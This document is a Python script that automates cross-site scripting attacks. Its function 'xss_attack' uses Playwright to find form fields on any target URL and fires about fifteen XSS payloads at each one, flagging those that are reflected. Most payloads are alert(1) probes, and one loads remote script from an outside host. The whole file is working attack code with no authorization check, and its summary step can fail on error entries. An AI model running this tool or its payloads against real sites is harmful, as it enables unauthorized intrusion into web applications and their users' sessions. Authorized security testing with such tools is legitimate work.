import requests
from playwright.async_api import async_playwright
import asyncio

async def xss_attack(target_url):

    #Combines field detection and XSS vulnerability testing on a target website.

    async def detect_fields(url):

        #Detects input, textarea, select fields, and forms on a web page.

        async with async_playwright() as p:
            browser = await p.chromium.launch(headless=True)
            page = await browser.new_page()
            try:
                # Navigate to the target URL and wait for the page to fully load
                await page.goto(url)
                await page.wait_for_load_state("networkidle")
                selectors = ["input", "textarea","form"]
                detected_fields = {}
                
                # Loop through the predefined selectors to identify fields
                for selector in selectors:
                    elements = await page.query_selector_all(selector)
                    for element in elements:
                        field_name = await element.get_attribute("name")
                        field_id = await element.get_attribute("id")
                        # Save the field's ID, name, and tag
                        detected_fields[field_id or field_name or selector] = {
                            "id": field_id,
                            "name": field_name,
                            "tag": selector
                        }
                return detected_fields
            finally:
                # Close the browser after processing
                await browser.close()

    def test_xss(url, param_name):

        #Tests fields for XSS vulnerabilities using common payloads.

        xss_payloads = [
        #DOM-Based XSS (JavaScript Injection)
        "<script>alert(1)</script>",
        "<svg onload=alert(1)>",
        "<img src=x onerror=alert(1)>",
        "<iframe srcdoc=<svg/onload=alert(1)></iframe>",
        # Attribute Injection (Event Handlers)
        "<x onmouseover=alert(1)>hover this!</x>",
        "<x contenteditable onkeydown=alert(1)>press any key!</x>",
        "<body onfocus=alert(1)>",
        #Stored XSS (Persistent Script Execution)
        "<form action=javascript:alert(1)><input type=submit>",
        "<x oncopy=alert(1)>copy this!</x>",
        #Reflected XSS (Dynamic Injection)
        "<a href=javascript:alert(1)>click</a>",
        #File Inclusion Techniques
        """<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>""",
        #Complex Scenarios
        "<script src=//brutelogic.com.br/1.js></script>",
        "<base href=//0>",
        "<marquee onstart=alert(1)>",
        "<object data=javascript:alert(1)>",
        ]

        results = []

        # Loop through each payload and send it to the target URL
        for i, payload in enumerate(xss_payloads):
            try:
                print(f"\nTesting XSS payload {i+1}:\n{payload}")
                response = requests.get(url, params={param_name: payload})
                print(f"Response Code: {response.status_code}")
                
                if payload in response.text:
                    print("Potential XSS vulnerability detected:")
                    print(response.text[:500])  # Limit the output for readability
                    results.append({
                        "payload": payload,
                        "reflected": True,
                        "response_preview": response.text[:500]
                    })
                else:
                    print("No XSS vulnerability detected.")
                    results.append({
                        "payload": payload,
                        "reflected": False
                    })
            except requests.exceptions.RequestException as e:
                # Log the error if the request fails
                print(f"Error while sending request: {e}")
                results.append({
                    "payload": payload,
                    "error": str(e)
                })

        return results

    # Step 1: Detect fields in the target URL
    fields = await detect_fields(target_url)
    if not fields:
        return {"message": "No fields detected.", "vulnerable": False}

    # Step 2: Test each field for XSS vulnerabilities
    overall_results = {}
    for field_name in fields:
        print(f"\nTesting field: {field_name}")
        results = test_xss(target_url, field_name)
        overall_results[field_name] = results

    # Summarize vulnerabilities
    vulnerable = any(
        result["reflected"] 
        for field_results in overall_results.values() 
        for result in field_results
    )
    message = "XSS vulnerabilities detected." if vulnerable else "No XSS vulnerabilities detected."
    return {"message": message,"vulnerable": vulnerable}
